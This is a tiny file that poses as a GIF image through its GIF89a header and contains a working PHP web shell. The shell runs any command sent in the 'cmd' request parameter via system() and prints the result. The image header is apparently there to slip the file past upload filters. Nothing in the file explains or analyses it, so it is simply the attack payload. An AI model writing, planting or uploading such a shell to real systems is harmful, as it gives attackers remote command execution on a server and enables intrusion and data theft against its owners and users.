GIF89a;
<?php
// Web Shell - Simple Command Execution
if(isset($_REQUEST['cmd'])){
    echo "<pre>";
    system($_REQUEST['cmd']);
    echo "</pre>";
}
?>
